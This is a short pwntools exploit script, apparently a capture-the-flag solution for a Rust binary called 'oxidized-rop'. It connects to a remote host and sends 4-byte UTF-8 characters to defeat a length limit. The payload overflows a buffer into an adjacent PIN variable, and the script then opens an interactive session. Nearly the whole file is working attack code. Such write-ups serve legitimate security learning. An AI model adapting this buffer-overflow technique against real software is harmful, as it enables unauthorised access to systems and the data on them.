from pwn import *
context.log_level = 'debug'
#r = process('./oxidized-rop')
#r = gdb.debug('./oxidized-rop', 'b _ZN12oxidized_rop4main17h3b2fbbcaac189096E\nc')
r = remote('206.189.28.151', 32723)
# use utf-8 4 byte characters to bypass the length limit since rust stores strings as utf-8
#u3byte = b'\xed\x95\x9c'
u4byte = b'\xf0\x90\x8d\x88'
r.sendlineafter(b': ', b'1')
#r.sendlineafter(b': ', u4byte*119+u3byte*3+b'\xed\x9f\xb8')
# overflow into the pin variable
# (we don't have enough info to do a rop)
payload = u4byte*((0x1a8-0x10)//4) + chr(123456).encode('utf-8')
r.sendlineafter(b': ', payload)
r.sendlineafter(b': ', b'2')
r.interactive()

